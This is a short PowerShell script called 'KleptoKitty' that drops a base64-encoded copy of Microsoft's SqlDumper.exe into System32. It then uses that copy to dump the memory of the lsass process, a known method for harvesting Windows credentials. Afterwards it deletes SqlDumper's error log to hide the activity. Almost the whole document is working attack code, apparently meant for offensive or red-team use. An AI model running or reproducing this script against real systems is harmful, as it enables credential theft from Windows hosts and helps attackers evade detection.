<#

     =^._.^=
    _(      )/  KleptoKitty

    How to build payload:

    1. Get SqlDumper from a Microsoft SQL server installation or Office365
    https://support.microsoft.com/en-us/help/917825/use-the-sqldumper-exe-utility-to-generate-a-dump-file-in-sql-server   

#>

# SqlDumper - Base64 encoded
$BlobSqlDumper = "<add base64 string here>"
$PathSqlDumper = "$env:SystemRoot\System32\SqlDumper.exe"

# Deploy SqlDumber and run it
$ProcessId = $(Get-Process -Name lsass).Id
cd "$env:SystemRoot\System32"
[IO.File]::WriteAllBytes($PathSqlDumper, [Convert]::FromBase64String($BlobSqlDumper))
&$PathSqlDumper $ProcessId 0 0x0110:40 

Remove-Item "$env:SystemRoot\System32\SQLDUMPER_ERRORLOG.log"
